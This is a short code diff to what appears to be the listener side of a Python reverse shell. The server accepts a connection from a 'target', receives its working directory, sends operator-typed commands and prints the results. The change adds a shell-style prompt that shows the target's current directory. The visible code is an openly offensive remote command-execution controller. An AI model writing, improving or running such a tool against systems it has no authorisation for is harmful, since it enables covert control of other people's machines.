@@ -15,10 +15,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     conn, addr = s.accept()
     with conn:
         print(f"Connected by {addr}")
-        print(f"CWD of target is: {conn.recv(1024).decode('utf-8')}")
+        client_working_directory = conn.recv(1024).decode('utf-8')
         while True:
             # get command to run
-            command = input("enter command to run: ")
+            print()
+            command = input(f"{client_working_directory} $> ")
             # exit case
             if command == ("exit"):
                 exit()
@@ -30,3 +31,5 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             print(recieved_output.decode('utf-8'))
             if recieved_output.decode('utf-8') == "client_stopped":
                 break
+            #recieve client working directory
+            client_working_directory = conn.recv(1024).decode('utf-8')
